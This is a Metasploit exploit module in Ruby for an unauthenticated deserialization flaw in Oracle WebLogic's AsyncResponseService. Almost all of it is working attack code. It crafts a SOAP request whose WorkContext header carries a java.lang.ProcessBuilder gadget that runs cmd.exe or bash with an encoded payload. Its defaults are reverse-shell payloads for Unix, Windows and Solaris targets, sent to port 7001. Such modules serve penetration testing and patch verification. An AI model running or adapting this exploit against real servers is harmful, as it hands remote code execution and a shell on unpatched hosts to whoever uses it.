##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Oracle Weblogic Server Deserialization RCE - AsyncResponseService ',
      'Description' => %q{
        An unauthenticated attacker with network access to the Oracle Weblogic Server T3
        interface can send a malicious SOAP request to the interface WLS AsyncResponseService
        to execute code on the vulnerable host.
      },
      'Author' =>
        [
        'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CNVD-C', '2019-48814'],
          ['URL', 'http://www.cnvd.org.cn/webinfo/show/4999']
        ],
      'Privileged' => false,
      'Platform' => %w{ unix win solaris },
      'Targets' =>
        [
          [ 'Unix',
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          ],
          [ 'Windows',
            'Platform' => 'win',
            'Payload' => {},
            'Arch' => [ARCH_X64, ARCH_X86],
            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}
          ],
          [ 'Solaris',
            'Platform' => 'solaris',
            'Arch' => ARCH_CMD,
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},
            'Payload' => {
              'Space'       => 2048,
              'DisableNops' => true,
              'Compat'      =>
                {
                  'PayloadType' => 'cmd',
                  'RequiredCmd' => 'generic perl telnet',
                }
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DefaultOptions' =>
        {
          'WfsDelay' => 12
        },
      'DisclosureDate' => 'Apr 23 2019'))

    register_options(
      [
        Opt::RPORT(7001),
        OptString.new('URIPATH', [true, 'URL to the weblogic instance', '']),
        OptString.new('WSPATH', [true, 'URL to AsyncResponseService', '/_async/AsyncResponseService'])
      ]
    )
  end

  def send_payload
    uri = normalize_uri(datastore['WSPATH'])

    print_status("Generating payload...")
    # payload creation
    if target.name == 'Windows'
      xml_cmd = '          <void index="0"> '
      xml_cmd <<  '            <string>cmd.exe</string> '
      xml_cmd <<  '          </void> '
      xml_cmd <<  '          <void index="1"> '
      xml_cmd <<  '            <string>/c</string> '
      xml_cmd <<  '          </void> '
      shell_payload = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true, encoded: false })
    elsif target.name == 'Unix' || target.name == 'Solaris'
      xml_cmd =  '          <void index="0"> '
      xml_cmd <<  '            <string>/bin/bash</string> '
      xml_cmd <<  '          </void> '
      xml_cmd <<  '          <void index="1"> '
      xml_cmd <<  '            <string>-c</string> '
      xml_cmd <<  '          </void> '
      shell_payload = payload.encoded
    end

    random_action = rand_text_alphanumeric(20)
    random_relates = rand_text_alphanumeric(20)

    print_status("[#{uri}] Sending payload...")
    soap_payload = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
    soap_payload <<  '  xmlns:wsa="http://www.w3.org/2005/08/addressing" '
    soap_payload <<  '  xmlns:asy="http://www.bea.com/async/AsyncResponseService"> '
    soap_payload <<  '  <soapenv:Header> '
    soap_payload <<  "    <wsa:Action>#{random_action}</wsa:Action> "
    soap_payload <<  '    <wsa:RelatesTo>#{random_relates}</wsa:RelatesTo> '
    soap_payload <<  '    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> '
    soap_payload <<  '      <void class="java.lang.ProcessBuilder"> '
    soap_payload <<  '        <array class="java.lang.String" length="3"> '

    soap_payload <<  xml_cmd # SO cli

    soap_payload <<  '          <void index="2"> '
    soap_payload <<  "            <string>#{xml_encode(shell_payload)}</string> "
    soap_payload <<  '          </void> '
    soap_payload <<  '        </array> '
    soap_payload <<  '        <void method="start"/> '
    soap_payload <<  '      </void> '
    soap_payload <<  '    </work:WorkContext> '
    soap_payload <<  '  </soapenv:Header> '
    soap_payload <<  '  <soapenv:Body> '
    soap_payload <<  '    <asy:onAsyncDelivery/> '
    soap_payload <<  '  </soapenv:Body> '
    soap_payload <<  '</soapenv:Envelope>'

    res = send_request_cgi(
      'uri'      => uri, #datastore['URIPATH'] + uri,
      'method'   => 'POST',
      'ctype'    => 'text/xml',
      'data'     => soap_payload,
      'headers'  => {'SOAPAction' => '' }
    )

    if res and res.code != 202
      print_error("Failed to exploit the vulnerability on #{uri}")
      return
    end
  end

  def xml_encode(str)
    ret = ""
    str.unpack('C*').each { |ch|
      case ch
      when 0x41..0x5a, 0x61..0x7a, 0x30..0x39
        ret << ch.chr
      else
        ret << "&#x"
        ret << ch.chr.unpack('H*')[0]
        ret << ";"
      end
    }
    ret
  end

  def exploit

    send_payload

    #handler
  end
end
